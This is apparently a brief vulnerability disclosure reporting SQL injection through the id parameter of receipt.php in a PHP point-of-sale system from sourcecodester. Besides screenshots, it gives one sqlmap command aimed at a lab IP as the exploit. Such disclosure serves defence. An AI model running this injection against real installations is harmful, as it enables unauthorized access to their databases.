vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16127/best-pos-management-system-php.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/220944581-040aae81-ca70-468d-aa5b-980134aca00f.png)


exp

```
sqlmap.py -u "http://192.168.31.50/kruxton/receipt.php?id=1"
```

![image](https://user-images.githubusercontent.com/30823782/220944669-1b775b61-c570-42c8-b46c-95aa166a8e33.png)
